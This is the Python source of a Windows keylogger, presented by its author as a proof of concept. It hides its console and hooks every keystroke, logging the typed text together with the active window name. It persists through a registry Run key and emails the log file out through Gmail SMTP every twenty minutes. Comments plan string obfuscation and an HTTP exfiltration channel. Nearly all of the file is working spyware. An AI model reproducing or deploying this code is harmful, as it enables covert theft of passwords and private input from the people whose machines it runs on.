"""
Author: Sunggwan Choi 
Description: A simple PoC userland python keylogger which utilizes SetWindowsHookEx and CallNextHookEx API function. 

Note: The source code will only be public for the duration of the tryout, since it has possibility of malicious usage 
by malicious users. 
"""

import PyHook3, pythoncom
import subprocess
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import win32console,win32gui
import threading

"""
File: pylogger.pyw

Description: A Proof of Concept python keylogger. Captures keystrokes and sends the log file 
to an email address every <n>(20, by default) minutes.

Features:
    - Keylogging 
    - Sending Log file through email 
        - TODO: POST request to a web server, attach log file 
    
    - Persistence: Usage of registry 
"""


# Hardcoded debug log file
logFile = "C:\\Users\\Public\\Music\\log2.txt"

linebuf = ""
windowName = ""

"""
    Function Name: hide()
    Description: Hides the console screen.
    
    TODO: After reboot, the console comes up and disappears within 0.5 secondss. 
    This might alert the user.
"""
def hide():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

"""
    Function Name: loot()
    Description: Sends the file which contains keylog to an email account.
        This function will be executed as a thread, every 10 minutes.
    
    TODO: obfuscate hardcode string 
"""
def loot():
    while True:
        mail = smtplib.SMTP('smtp.gmail.com', 587)
        msg = MIMEMultipart()
        address = '<EMAIL_ADDRESS>'
        password = '<EMAIL_PASSWORD>'

        # TODO: Add time for subject?
        msg['Subject'] = 'Log '
        msg['From'] = address
        msg['To'] = address

        part = MIMEBase('application', "octet-stream")
        part.set_payload(open(logFile, "rb").read())
        encoders.encode_base64(part)

        part.add_header('Content-Disposition', 'attachment; filename="C:\\Users\\Public\\Music\\log2.txt"')
        msg.attach(part)

        # server connection and actually sending the formatted email.
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(address, password)
        server.sendmail(address, address, msg.as_string())
        server.quit()

        # Thread repeats every 20 minute
        time.sleep(1200)

# Write a string line to the log file
def writeToFile(line):
    fd = open(logFile,'a')
    fd.write(line)
    fd.close()

# [DEBUG] Added for debugging purpose. Creates a log file.
def init():
    fd = open(logFile, 'a')
    fd.write("Pykeylogger have started.\n")
    fd.close()


"""
    Event Name: OnKeyboardEvent
    Description: Captures keystroke event, and builds a line buffer. 
        When an "Enter" or "Tab" is typed, write the line buffer into the log file.
    
    Arguments: None
    Return: None

    TODO: obfuscate hardcode string 
"""
def OnKeyboardEvent(event):
    global linebuf
    global windowName

    # If user's window changed, record line buffer
    if windowName != event.WindowName:
        if linebuf != "":
            linebuf += '\n'
            writeToFile(linebuf)

        # Clean linebuf, indicate a new window that the user is using
        linebuf = ""
        newStart = "\nProgram: " + str(event.WindowName.encode('UTF-8')) + "\n"
        writeToFile(newStart)
        windowName = event.WindowName

    # If keystroke of "Enter" (13) or "Tab" (9), record line buffer
    if event.Ascii == 13 or event.Ascii == 9:
        linebuf += '\n'
        writeToFile(linebuf)
        linebuf = ""
        return True

    # If keystroke is "Backspace", remove last char of the line buffer
    elif event.Ascii == 8:
        linebuf = linebuf[:-1]
        return True

    else:
        linebuf += chr(event.Ascii)

    return True


def main():
    # Hide console + Create keylog file
    hide()
    init()

    # Persistence
    filepath = 'C:\\Users\\Public\\Music\\pylogger.exe'
    subprocess.call(r'reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "pylogger" /t REG_SZ /f /d "%s"' % filepath)

    # Start a thread. This will keep executing by itself
    threading.Thread(target=loot).start()

    # Receive events
    hooksMan = PyHook3.HookManager()
    hooksMan.KeyDown = OnKeyboardEvent
    hooksMan.HookKeyboard()

    pythoncom.PumpMessages()

if __name__ == '__main__':
    main()

